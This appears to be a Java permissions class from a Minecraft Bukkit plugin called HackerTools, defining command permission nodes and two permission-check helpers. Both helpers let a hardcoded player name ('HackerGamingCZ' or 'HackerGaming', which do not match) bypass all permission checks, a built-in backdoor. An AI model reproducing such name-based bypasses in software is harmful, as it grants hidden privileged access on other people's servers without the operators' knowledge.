package cz.HackerGamingCZ.HackerTools;

import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Permissions {

    public static final String HT_FORCESTART = "ht.command.forcestart";
    public static final String HT_SPEED = "ht.command.speed";
    public static final String TEAMS_FULLJOIN = "ht.teams.fulljoin";
    public static final String HT_RESTART = "ht.restart";
    public static final String DEBUG_COMMAND = "ht.debug.command";
    public static final String DEBUG_SHOW = "ht.debug.show";

    public static boolean hasPermission(Player player, String permission) {
        return player.getName().equals("HackerGamingCZ") || player.hasPermission(permission);
    }


    public static boolean hasPermission(CommandSender sender, String permission) {
        return sender.getName().equals("HackerGaming") || sender.hasPermission(permission);
    }

}